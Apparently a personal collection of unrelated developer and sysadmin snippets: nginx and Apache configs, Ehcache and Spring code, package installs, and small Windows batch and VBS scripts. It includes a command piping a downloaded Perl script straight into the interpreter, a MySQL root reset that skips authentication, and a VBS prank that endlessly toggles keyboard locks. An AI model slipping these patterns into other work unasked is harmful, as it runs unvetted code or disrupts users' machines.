java -jar bfg.jar --strip-blobs-bigger-than 100M some-big-repo.git
$ cd some-big-repo.git
$ git reflog expire --expire=now --all && git gc --prune=now --aggressive
git push

$ bfg --delete-files id_{dsa,rsa}  my-repo.git
$ bfg --strip-blobs-bigger-than 50M  my-repo.git
$ bfg --replace-text passwords.txt  my-repo.git
$ bfg --delete-folders .git --delete-files .git  --no-blob-protection  my-repo.git
$ bfg --strip-biggest-blobs 100 --protect-blobs-from master,maint,next repo.git
--------------------------------------------------------------------------------------------------------
gem install asciidoctor
--------------------------------------------------------------------------------------------------------
docker run -d --name postgres -p 5432:5432 -e POSTGRES_USER=reactive -e POSTGRES_PASSWORD=reactive123 -e POSTGRES_DB=reactive postgres
--------------------------------------------------------------------------------------------------------
$ curl -d '{"name":"Test1"}' -H "Content-Type: application/json" -X POST http://localhost:8095/organizations
$ curl -d '{"name":"Name1", "balance":5000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
$ curl -d '{"name":"Name2", "balance":10000, "organizationId":1}' -H "Content-Type: application/json" -X POST http://localhost:8090/employees
--------------------------------------------------------------------------------------------------------
$ rm -rf ~/Library/Caches/IntelliJIdea15
$ rm -rf ~/Library/Preferences/IntelliJIdea15
--------------------------------------------------------------------------------------------------------
curl -I https://yourzone-1c6b.kxcdn.com/assets/css/style.css
--------------------------------------------------------------------------------------------------------
Dism /Split-Image /ImageFile:J:\sources\install.wim /SWMFile:H:\CustomInstall\install.swm /FileSize:1000
--------------------------------------------------------------------------------------------------------
readelf -s file
--------------------------------------------------------------------------------------------------------
cd ~/.ssh
ssh-keygen -o
ssh-add /path/to/your/private.key
cat id_rsa.pub
--------------------------------------------------------------------------------------------------------
systemctl start nginx

service nginx stop
systemctl stop nginx

killall -9 nginx

service nginx reload
systemctl reload nginx

nginx -t

service nginx -v
systemctl -v nginx
--------------------------------------------------------------------------------------------------------
.htaccess#
<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>
Nginx#
location ~ \.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$ {
    add_header Access-Control-Allow-Origin "*";
}
--------------------------------------------------------------------------------------------------------
httpd -V
apache2 -M
httpd -M

authn_alias_module
authn_anon_module
authn_dbm_module
authn_default_module
authz_dbm_module
authz_default_module
authnz_ldap_module
cache_module
cgi_module
disk_cache_module
include_module
ldap_module
proxy_balancer_module
proxy_ftp_module
proxy_http_module
proxy_ajp_module
proxy_connect_module
suexec_module
version_module

server {
    server_name origin.example.com;
    listen 80;

    root /var/www/example;
    index index.php index.html index.htm;

    set $cache_path $request_uri;

    # bypass cache for POST requests
    if ($request_method = POST) {
        set $cache_path 'nocache';
    }

    # don't cache login/admin URLs
    if ($request_uri ~* "/(wp-login.php|wp-admin|login.php|backend|admin)") {
        set $cache_path 'nocache';
    }

    # don't cache if there is a cookie called PHPSESSID
    if ($http_cookie ~* "PHPSESSID") {
        set $cache_path 'nocache';
    }

    # bypass cache for logged in users
    if ($http_cookie ~ (wp-postpass|wordpress_|comment_author)_) {
        set $cache_path 'nocache';
    }

    # bypass cache if query string not empty
    if ($query_string) {
        set $cache_path 'nocache';
    }

    location / {
        # this line is specific to Cache Enabler
        try_files /wp-content/cache/cache-enabler/${http_host}${cache_path}index.html $uri $uri/ /index.php?$args;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
    }

    # php7 fastcgi
    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        ...

        fastcgi_intercept_errors on;

        if ($cache_path = 'nocache') {
            expires -1;
            add_header Cache-Control no-cache;
        }
        if ($cache_path != 'nocache') {
            expires +1h;
        }
    }

    # static assets
    location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ {
        log_not_found off;

        add_header Cache-Control "max-age=604800, stale-while-revalidate=86400, stale-if-error=604800";
    }
}
--------------------------------------------------------------------------------------------------------
curl -sL https://raw.githubusercontent.com/richardforth/apache2buddy/master/apache2buddy.pl | perl
--------------------------------------------------------------------------------------------------------
grep processor /proc/cpuinfo | wc -l
--------------------------------------------------------------------------------------------------------
npm install -g caniuse-cmd
caniuse preload

npm install uglify-js -g
uglifyjs jquery-3.2.1.js --output jquery-3.2.1.min.js

uglifyjs jquery-3.2.1.js --compress --mangle --output jquery-3.2.1.min.js

glifyjs jquery-3.2.1.js --compress sequences=true,conditionals=true,booleans=true --mangle --output jquery-3.2.1.min.js
--------------------------------------------------------------------------------------------------------
sudo apt install kodi
sudo apt install software-properties-common
sudo add-apt-repository ppa:team-xbmc/ppa
sudo apt update
sudo apt install kodi

sudo apt update
sudo apt install kodi

sudo dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm
sudo gedit /etc/selinux/config
sudo dnf install kodi

pacman -Syu
pacman -S kodi
--------------------------------------------------------------------------------------------------------
Manifest-Version: 1.0
Export-Package: com.netflix.hystrix;version="1.5.12";uses:="com.netfli
 x.hystrix.collapser,com.netflix.hystrix.metric,com.netflix.hystrix.st
 rategy.concurrency,com.netflix.hystrix.strategy.properties,com.netfli
 x.hystrix.util,rx,rx.functions",com.netflix.hystrix.collapser;version
 ="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystrix.strategy.con
 currency,com.netflix.hystrix.util,rx",com.netflix.hystrix.config;vers
 ion="1.5.12";uses:="com.netflix.hystrix,rx",com.netflix.hystrix.excep
 tion;version="1.5.12";uses:="com.netflix.hystrix",com.netflix.hystrix
 .metric;version="1.5.12";uses:="com.netflix.hystrix,com.netflix.hystr
 ix.strategy.concurrency,org.HdrHistogram,rx,rx.functions",com.netflix
 .hystrix.metric.consumer;version="1.5.12";uses:="com.netflix.hystrix,
 com.netflix.hystrix.metric,org.HdrHistogram,rx,rx.functions",com.netf
 lix.hystrix.metric.sample;version="1.5.12";uses:="com.netflix.hystrix
 ,rx",com.netflix.hystrix.strategy;version="1.5.12";uses:="com.netflix
 .hystrix.strategy.concurrency,com.netflix.hystrix.strategy.eventnotif
 ier,com.netflix.hystrix.strategy.executionhook,com.netflix.hystrix.st
 rategy.metrics,com.netflix.hystrix.strategy.properties",com.netflix.h
 ystrix.strategy.concurrency;version="1.5.12";uses:="com.netflix.hystr
 ix,com.netflix.hystrix.strategy.properties,rx,rx.functions",com.netfl
 ix.hystrix.strategy.eventnotifier;version="1.5.12";uses:="com.netflix
 .hystrix",com.netflix.hystrix.strategy.executionhook;version="1.5.12"
 ;uses:="com.netflix.hystrix,com.netflix.hystrix.exception",com.netfli
 x.hystrix.strategy.metrics;version="1.5.12";uses:="com.netflix.hystri
 x",com.netflix.hystrix.strategy.properties;version="1.5.12";uses:="co
 m.netflix.config,com.netflix.hystrix",com.netflix.hystrix.strategy.pr
 operties.archaius;version="1.5.12";uses:="com.netflix.hystrix.strateg
 y.properties",com.netflix.hystrix.util;version="1.5.12";uses:="com.ne
 tflix.hystrix,com.netflix.hystrix.strategy.properties"
Implementation-Title: com.netflix.hystrix#hystrix-core;1.5.12
Change: a7b66ca
Built-By: jenkins
Tool: Bnd-3.2.0.201605172007
Gradle-Version: 3.1
Built-OS: Linux
Build-Host: https://netflixoss.ci.cloudbees.com/
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.6))"
Module-Source: /hystrix-core
Build-Number: 72
Module-Origin: git@github.com:Netflix/Hystrix.git
Bundle-SymbolicName: com.netflix.hystrix.core
Build-Id: 72
Eclipse-ExtensibleAPI: true
X-Compile-Target-JDK: 1.6
Implementation-Version: 1.5.12
Module-Owner: netflixoss@netflix.com
Bundle-Name: hystrix-core
Created-By: 1.7.0_79-b15 (Oracle Corporation)
Build-Job: NetflixOSS/Hystrix/Hystrix-release
Build-Date: 2017-05-16_16:00:19
X-Compile-Source-JDK: 1.6
Build-Java-Version: 1.7.0_79
Bundle-Vendor: Netflix
Built-Status: integration
Bundle-Version: 1.5.12
Branch: master
Bnd-LastModified: 1494975639000
Bundle-ManifestVersion: 2
Module-Email: netflixoss@netflix.com
Import-Package: com.netflix.config,com.netflix.hystrix;version="[1.5,2
 )",com.netflix.hystrix.collapser;version="[1.5,2)",com.netflix.hystri
 x.exception;version="[1.5,2)",com.netflix.hystrix.metric;version="[1.
 5,2)",com.netflix.hystrix.metric.consumer;version="[1.5,2)",com.netfl
 ix.hystrix.strategy;version="[1.5,2)",com.netflix.hystrix.strategy.co
 ncurrency;version="[1.5,2)",com.netflix.hystrix.strategy.eventnotifie
 r;version="[1.5,2)",com.netflix.hystrix.strategy.executionhook;versio
 n="[1.5,2)",com.netflix.hystrix.strategy.metrics;version="[1.5,2)",co
 m.netflix.hystrix.strategy.properties;version="[1.5,2)",com.netflix.h
 ystrix.util;version="[1.5,2)",org.HdrHistogram;version="[2.1,3)",org.
 slf4j;version="[1.7,2)",rx;version="[1.2,2)",rx.functions;version="[1
 .2,2)",rx.internal.schedulers;version="[1.2,2)",rx.observables;versio
 n="[1.2,2)",rx.observers;version="[1.2,2)",rx.schedulers;version="[1.
 2,2)",rx.subjects;version="[1.2,2)",rx.subscriptions;version="[1.2,2)
 ",sun.misc]
Embed-Dependency: *;scope=compile
Bundle-DocURL: https://github.com/Netflix/Hystrix
--------------------------------------------------------------------------------------------------------
	static {
		WEAVING_MODE = System.getProperty("weavingMode", WeavingMode.RUNTIME.name()).toUpperCase();
	}
--------------------------------------------------------------------------------------------------------
<ehcache xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:noNamespaceSchemaLocation="ehcache.xsd" 
	updateCheck="true"
	monitoring="autodetect" 
	dynamicConfig="true">

	<diskStore path="java.io.tmpdir" />
	
	<cache name="movieFindCache" 
		maxEntriesLocalHeap="10000"
		maxEntriesLocalDisk="1000" 
		eternal="false" 
		diskSpoolBufferSizeMB="20"
		timeToIdleSeconds="300" timeToLiveSeconds="600"
		memoryStoreEvictionPolicy="LFU" 
		transactionalMode="off">
		<persistence strategy="localTempSwap" />
	</cache>

</ehcache>

import org.springframework.cache.CacheManager;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.cache.ehcache.EhCacheCacheManager;
import org.springframework.cache.ehcache.EhCacheManagerFactoryBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.io.ClassPathResource;

@Configuration
@EnableCaching
@ComponentScan({ "com.mkyong.*" })
public class AppConfig {

	@Bean
	public CacheManager cacheManager() {
		return new EhCacheCacheManager(ehCacheCacheManager().getObject());
	}

	@Bean
	public EhCacheManagerFactoryBean ehCacheCacheManager() {
		EhCacheManagerFactoryBean cmfb = new EhCacheManagerFactoryBean();
		cmfb.setConfigLocation(new ClassPathResource("ehcache.xml"));
		cmfb.setShared(true);
		return cmfb;
	}
}
--------------------------------------------------------------------------------------------------------
import org.ehcache.event.CacheEvent;
import org.ehcache.event.CacheEventListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CacheEventLogger implements CacheEventListener<Object, Object> {

    private static final Logger log = LoggerFactory.getLogger(CacheEventLogger.class);

    @Override
    public void onEvent(CacheEvent<? extends Object, ? extends Object> cacheEvent) {
        log.info("Cache event {} for item with key {}. Old value = {}, New value = {}", cacheEvent.getType(), cacheEvent.getKey(), cacheEvent.getOldValue(), cacheEvent.getNewValue());
    }
}

spring.cache.jcache.config=classpath:ehcache.xml

<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns="http://www.ehcache.org/v3"
    xmlns:jsr107="http://www.ehcache.org/v3/jsr107"
    xsi:schemaLocation="
            http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd
            http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">

    <cache alias="squareCache">
        <key-type>java.lang.Long</key-type>
        <value-type>java.math.BigDecimal</value-type>
        <expiry>
            <ttl unit="seconds">30</ttl>
        </expiry>

        <listeners>
            <listener>
                <class>com.baeldung.cachetest.config.CacheEventLogger</class>
                <event-firing-mode>ASYNCHRONOUS</event-firing-mode>
                <event-ordering-mode>UNORDERED</event-ordering-mode>
                <events-to-fire-on>CREATED</events-to-fire-on>
                <events-to-fire-on>EXPIRED</events-to-fire-on>
            </listener>
        </listeners>

        <resources>
            <heap unit="entries">2</heap>
            <offheap unit="MB">10</offheap>
        </resources>
    </cache>

</config>
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
apply plugin: 'eclipse-wtp'
 
version = '1.0'

// Uses JDK 7
sourceCompatibility = 1.7
targetCompatibility = 1.7

// Get dependencies from Maven central repository
repositories {
	mavenCentral()
}

//Project dependencies
dependencies {
	compile 'org.springframework:spring-context:4.1.4.RELEASE'
	compile 'org.springframework:spring-context-support:4.1.4.RELEASE'
	compile 'net.sf.ehcache:ehcache:2.9.0'
	compile 'ch.qos.logback:logback-classic:1.0.13'
}
--------------------------------------------------------------------------------------------------------
@CacheResult(cacheName="books", exceptionCacheName="failures"
            cachedExceptions = InvalidIsbnNotFoundException.class)
public Book findBook(ISBN isbn)
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "stepOne")
public String stepOne(@Validated(Account.ValidationStepOne.class) Account account) {...}

@RequestMapping(value = "stepTwo")
public String stepTwo(@Validated(Account.ValidationStepTwo.class) Account account) {...}

public class Account {

    @NotBlank(groups = {ValidationStepOne.class})
    private String username;

    @Email(groups = {ValidationStepOne.class})
    @NotBlank(groups = {ValidationStepOne.class})
    private String email;

    @NotBlank(groups = {ValidationStepTwo.class})
    @StrongPassword(groups = {ValidationStepTwo.class})
    private String password;

    @NotBlank(groups = {ValidationStepTwo.class})
    private String confirmedPassword;

}
--------------------------------------------------------------------------------------------------------
mkdir /var/www/testsite.com
echo "Hello World" > /var/www/testsite.com/index.php
chmod -R 755 /var/www/testsite.com

cp /etc/nginx/sites-available/default /etc/nginx/sites-available/testsite.com.conf

server {
    listen 80;

    server_name testsite.com;

    rewrite ^ https://testsite.com$request_uri? permanent;
}

server {
    listen 443 ssl http2;

    ssl_certificate /etc/letsencrypt/live/testsite.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/testsite.com/privkey.pem;
    ssl_stapling on;

    server_name testsite.com;

    root /var/www/testsite.com;

    location / {
        try_files $uri /index.php?$args;
    }

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }
}

map $http_user_agent $ua_device {
    default "desktop";
    "~*(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge\ |maemo|midp|mmp|mobile.+firefox|netfront|opera\ m(ob|in)i|palm(\ os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows\ ce|xda|xiino/i" "mobile";
    "~*android|ipad|playbook|silk/i" "tablet";
}

autoindex_exact_size; - This directive specifies whether Nginx should display the exact file sizes of the output in the directory index or simply round to the nearest KB, MB, or GB. This directive has 2 options: on | off.
autoindex_format; - This directive specifies what format the Nginx index listing should be outputted to. This directive has 4 options: html | xml | json | jsonp.
autoindex_localtime; - This directive specifies whether the times for the directory listing should be outputted to local time or UTC. This directive has 2 options: on | off.
An example of a location directive using all 4 autoindex options could resemble the following.

location /somedirectory/ {
    autoindex on;
    autoindex_exact_size off;
    autoindex_format html;
    autoindex_localtime on;
}

ln -s /etc/nginx/sites-available/testsite.com.conf /etc/nginx/sites-enabled/testsite.com.conf
service nginx restart
--------------------------------------------------------------------------------------------------------
$ /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --remote-debugging-port=9222 --no-first-run --no-default-browser-check --user-data-dir=$(mktemp -d -t 'chrome-remote_data_dir')
--------------------------------------------------------------------------------------------------------
$ curl "https://tools.keycdn.com/geo.json?host={IP or hostname}"
--------------------------------------------------------------------------------------------------------
sudo tail /var/log/apache/access.log
sudo tail /var/log/apache2/access.log

sudo tail /var/log/apache2/error.log

LogFormat "%h %l %u %t \"%r\" %>s %b" common.

Now let’s break down what each section of that log means.

%h - The IP address of the client.
%l - The identity of the client determined by identd on the client’s machine. Will return a hyphen (-) if this information is not available.
%u - The userid of the client if the request was authenticated.
%t - The time that the request was received.
\"%r\" - The request line that includes the HTTP method used, the requested resource path, and the HTTP protocol that the client used.
%>s - The status code that the server sends back to the client.
%b - The size of the object requested

LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-agent}i\"" combined
CustomLog log/access_log combined
--------------------------------------------------------------------------------------------------------
.htaccess needs to be enabled with AllowOverride

# BEGIN WordPress
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# END WordPress

sudo service apache2 restart

<Directory /var/www/wordpress>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Order allow,deny
    allow from all

    # BEGIN WordPress
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteBase /
        RewriteRule ^index\.php$ - [L]
        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteCond %{REQUEST_FILENAME} !-d
        RewriteRule . /index.php [L]
    </IfModule>
    # END WordPress
</Directory>

sudo apache2ctl -t

location ~ /wp-content/themes/.*\.(js|css)$ {
    add_header Cache-Control no-cache;
}
location ~ genericons\.css {
    add_header Cache-Control no-cache;
}

<FilesMatch "genericons\.css">
    Header set Cache-Control "no-cache"
</FilesMatch>

<FilesMatch "\.(png|xml)$">
    Header set Cache-Control "no-cache"
</FilesMatch>

LogLevel alert rewrite:trace6
--------------------------------------------------------------------------------------------------------
Mac / Linux: traceroute6 2a00:1450:400a:804::2004
Windows: tracert -6 2a00:1450:400a:804::2004
--------------------------------------------------------------------------------------------------------
apt-get update
apt-get install nginx
Once Nginx has been installed, the next step is to disable the default virtual host.

unlink /etc/nginx/sites-enabled/default
Then, we need to create a file within the /etc/nginx/sites-available directory that contains the reverse proxy information. We can name this reverse-proxy.conf for example.

server {
    listen 80;
    location / {
        proxy_pass http://192.x.x.2;
    }
}

ln -s /etc/nginx/sites-available/reverse-proxy.conf /etc/nginx/sites-enabled/reverse-proxy.conf

service nginx configtest
service nginx restart
--------------------------------------------------------------------------------------------------------
sudo vi /etc/network/interfaces

### Start IPV6 static configuration
iface eth0 inet6 static
address 2607:f0d0:2001:000a:0000:0000:0000:0010
netmask 64
gateway 2607:f0d0:2001:000a:0000:0000:0000:0001
### END IPV6 configuration

sudo systemctl restart networking

ifconfig eth0
ip -6 address show eth0
--------------------------------------------------------------------------------------------------------
log_directory = 'pg_log'                    
log_filename = 'postgresql-dateformat.log'
log_statement = 'all'
logging_collector = on
--------------------------------------------------------------------------------------------------------
ALTER DATABASE your_database_name SET log_statement = 'all';
--------------------------------------------------------------------------------------------------------
Header set Custom-Header-Name "Custom Header Value"
add_header Custom-Header-Name "Custom Header Value"
--------------------------------------------------------------------------------------------------------
Ensure that you have the following libraries installed on your server. Otherwise, the mod_cdn module may not work as expected.

sudo apt-get install libxml2-dev libapr1-dev apache2-dev libssl-dev
From your CLI, download the mod_cdn module with the following snippet and change into the mod_cdn-1.1.0 directory once the file has been unzipped.

wget http://agile.internap.com/assets/mod_cdn-1.1.0.tar.gz
Compile the mod_cdn from source against Apache 2.2.7 or higher.

Copy mod_cdn.so to the following directory /usr/lib/apache2/modules/. Additionally, ensure that the cdn.load file contains the following:

LoadFile /usr/lib/libxml2.so.2
LoadFile /usr/lib/libssl.so.0.9.8
LoadModule cdn_module /usr/lib/apache2/modules/mod_cdn.so
Now, we need to copy the cdn.load and cdn.conf files into the /etc/apache2/mods-available/ directory with the following command.

cd /etc/apache2/mods-enabled
cp cdn.load /etc/apache2/mods-available/
cp cdn.conf /etc/apache2/mods-available/
Then, link them from mods-enabled with the following.

ln -s ../mods-available/cdn.conf cdn.conf
ln -s ../mods-available/cdn.load cdn.load
There are a variety of Apache directives that can be used within your configuration file to properly deliver the desired static assets from the CDN instead of the origin server. You must define the following snippet within the if you want to rewrite all of your site’s static assets to use the CDN URL. However, you can also specifically define a set of directives for a particular directory if you do not want to accelerate the entire website.

<IfModule mod_cdn.c>
    CDNHTMLDocType XHTML
    CDNHTMLToServer https://cdn.yourwebsite.com
    CDNHTMLFromServers https://yourwebsite.com
    CDNHTMLRemapURLServer \.png$ i
    CDNHTMLRemapURLServer \.jpg$ i
    CDNHTMLRemapURLServer \.gif$ i
    CDNHTMLRemapURLServer \.css$ i
    CDNHTMLRemapURLServer \.js$ i

    CDNHTMLLinks img src
    CDNHTMLLinks link href
    CDNHTMLLinks object data
    CDNHTMLLinks input src
    CDNHTMLLinks script src
    CDNHTMLLinks a href
</IfModule>
The snippet above enables the Apache CDN configuration by telling the server which extensions should be replaced. The CDNHTMLToServer directive corresponds to your CDN’s Zone URL (e.g. lorem-1c6b.kxcdn.com) or Zone Alias (e.g. cdn.yourwebsite.com). The CDNHTMLFromServers corresponds to your origin domain. The CDNHTMLRemapURLServer directive defines the extensions for which you want to accelerate. Finally, the CDNHTMLLinks directive defines the tag / attribute pair for which the module expects to find links to content in order to replace them.

Once you have defined the snippet from step 5 in your Apache’s configuration file, save your changes and restart Apache with the following command service apache2 restart. Once Apache has restarted, go to your website and view the page source to ensure that the static assets you have defined are being properly rewritten to reflect the CDN URL.
--------------------------------------------------------------------------------------------------------
server {
    listen 80;
    server_name domain.com www.domain.com;
    return 301 https://domain.com$request_uri;
}

RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]

<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="https redirect">
                    <match url="(.*)" ignoreCase="false" />
                    <conditions>
                        <add input="{HTTPS}" pattern="off" ignoreCase="false" />
                    </conditions>
                    <action type="Redirect" redirectType="Found" url="https://{HTTP_HOST}{REQUEST_URI}" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration>
--------------------------------------------------------------------------------------------------------
mysqladmin -u userX -p oldpassword newpassword

/etc/init.d/mysql stop
mysqld_safe --skip-grant-tables &
mysql -u root
use mysql;
update user set password=PASSWORD("newpassword") where User='root';
flush privileges;
quit
/etc/init.d/mysql stop
/etc/init.d/mysql start
--------------------------------------------------------------------------------------------------------
server {
    listen 443 ssl http2;

    ssl_certificate server.crt;
    ssl_certificate_key server.key;
}
service nginx reload
--------------------------------------------------------------------------------------------------------
log_format combined '$remote_addr - $remote_user [$time_local]'
    '"$request" $status $body_bytes_sent '
    '"$http_referer" "$http_user_agent"';
access_log /var/log/nginx/access.log log_file combined;
	
error_log /var/log/nginx/error.log warn;

debug - Useful debugging information to help determine where the problem lies.
info - Informational messages that aren’t necessary to read but may be good to know.
notice - Something normal happened that is worth noting.
warn - Something unexpected happened, however is not a cause for concern.
error - Something was unsuccessful.
crit - There are problems that need to be critically addressed.
alert - Prompt action is required.
emerg - The system is in an unusable state and requires immediate attention.

awk '{print $9}' access.log | sort | uniq -c | sort -rn
awk '($9 ~ /302/)' access.log | awk '{print $7}' | sort | uniq -c | sort -rn
--------------------------------------------------------------------------------------------------------
ErrorDocument 403 /forbidden.html
ErrorDocument 404 /notfound.html
ErrorDocument 500 /servererror.html

Header set X-Custom "Custom Value"

order allow,deny
deny from 255.x.x.x
deny from 123.x.x.x
allow from all

RewriteCond %{HTTP_REFERER} unwanteddomain\.com [NC,OR]
RewriteCond %{HTTP_REFERER} unwanteddomain2\.com
RewriteRule .* - [F]

AddType image/gif .gif .GIF

## EXPIRES CACHING ##
<IfModule mod_expires.c>
    ExpiresActive On
    ExpiresByType image/jpg "access 1 year"
    ExpiresByType image/jpeg "access 1 year"
    ExpiresByType image/gif "access 1 year"
    ExpiresByType image/png "access 1 year"
    ExpiresByType text/css "access 1 month"
    ExpiresByType text/html "access 1 month"
    ExpiresByType application/pdf "access 1 month"
    ExpiresByType text/x-javascript "access 1 month"
    ExpiresByType application/x-shockwave-flash "access 1 month"
    ExpiresByType image/x-icon "access 1 year"
    ExpiresDefault "access 1 month"
</IfModule>
## EXPIRES CACHING ##

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE application/vnd.ms-fontobject
    AddOutputFilterByType DEFLATE application/x-font
    AddOutputFilterByType DEFLATE application/x-font-opentype
    AddOutputFilterByType DEFLATE application/x-font-otf
    AddOutputFilterByType DEFLATE application/x-font-truetype
    AddOutputFilterByType DEFLATE application/x-font-ttf
    AddOutputFilterByType DEFLATE application/x-javascript
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE font/opentype
    AddOutputFilterByType DEFLATE font/otf
    AddOutputFilterByType DEFLATE font/ttf
    AddOutputFilterByType DEFLATE image/svg+xml
    AddOutputFilterByType DEFLATE image/x-icon
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE text/plain
    AddOutputFilterByType DEFLATE text/xml
</IfModule>

RewriteCond %{REQUEST_METHOD} !^(HEAD|OPTIONS|POST|PUT)
RewriteRule .* - [F]

Redirect 301 https://yourwebsite.com/old-page https://yourwebsite.com/new-page

<IfModule mod_headers.c>
    <FilesMatch "\.(ttf|ttc|otf|eot|woff|font.css|css|js|gif|png|jpe?g|svg|svgz|ico|webp)$">
        Header set Access-Control-Allow-Origin "*"
    </FilesMatch>
</IfModule>

<img srcset="image1-730x365.png 730w,
             image1-380x190.png 380w,
             image1-768x384.png 768w,
             image1-1024x512.png 1024w,
             image1-730x365@2x.png 1460w,
             image1-380x190@2x.png 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.png" width="730" height="365"
<img srcset="image1-730x365.webp 730w,
             image1-380x190.webp 380w,
             image1-768x384.webp 768w,
             image1-1024x512.webp 1024w,
             image1-730x365@2x.webp 1460w,
             image1-380x190@2x.webp 760w"
     sizes="(max-width: 730px) 100vw,
            730px"
     src="image1-730x365.webp" width="730" height="365">
--------------------------------------------------------------------------------------------------------
@echo off
color 02
:tricks
echo %random%%random%%random%%random%%random%%random%%random%%random%
goto tricks
--------------------------------------------------------------------------------------------------------
.LOG
--------------------------------------------------------------------------------------------------------
Dim Message, Speak
Message=InputBox("Enter text","Speak")
Set Speak=CreateObject("sapi.spvoice")
Speak.Speak Message
--------------------------------------------------------------------------------------------------------
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{CAPSLOCK}"
wshshell.sendkeys "{NUMLOCK}"
wshshell.sendkeys "{SCROLLLOCK}"
loop
--------------------------------------------------------------------------------------------------------
@echo off
color 0e
title Guessing Game by seJma
set /a guessnum=0
set /a answer=%RANDOM%
set variable1=surf33
echo -------------------------------------------------
echo Welcome to the Guessing Game!
echo.
echo Try and Guess my Number!
echo -------------------------------------------------
echo.
:top
echo.
set /p guess=
echo.
if %guess% GTR %answer% ECHO Lower!
if %guess% LSS %answer% ECHO Higher!
if %guess%==%answer% GOTO EQUAL
set /a guessnum=%guessnum% +1
if %guess%==%variable1% ECHO Found the backdoor hey?, the answer is: %answer%
goto top
:equal
echo Congratulations, You guessed right!!!
echo.
echo It took you %guessnum% guesses.
echo.
pause
--------------------------------------------------------------------------------------------------------
@echo off
:Start2
cls
goto Start
:Start
title Password Generator
echo I will make you a new password.
echo Please write the password down somewhere in case you forget it.
echo ----------------------------------------¬-----------------------
echo 1) 1 Random Password
echo 2) 5 Random Passwords
echo 3) 10 Random Passwords
echo Input your choice
set input=
set /p input= Choice:
if %input%==1 goto A if NOT goto Start2
if %input%==2 goto B if NOT goto Start2
if %input%==3 goto C if NOT goto Start2
:A
cls
echo Your password is %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:Exit
exit
:B
cls
echo Your 5 passwords are %random%, %random%, %random%, %random%, %random%.
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
:C
cls
echo Your 10 Passwords are %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%
echo Now choose what you want to do.
echo 1) Go back to the beginning
echo 2) Exit
set input=
set /p input= Choice:
if %input%==1 goto Start2 if NOT goto Start 2
if %input%==2 goto Exit if NOT goto Start 2
--------------------------------------------------------------------------------------------------------
@echo off
title Batch Calculator by seJma
color 1f
:top
echo --------------------------------------------------------------
echo Welcome to Batch Calculator
echo --------------------------------------------------------------
echo.
set /p sum=
set /a ans=%sum%
echo.
echo = %ans%
echo --------------------------------------------------------------
pause
cls
echo Previous Answer: %ans%
goto top
pause
exit
--------------------------------------------------------------------------------------------------------
	private static String toHash(Object obj) {
		return (obj == null ? "" : "@" + Integer.toHexString(System.identityHashCode(obj)));
	}
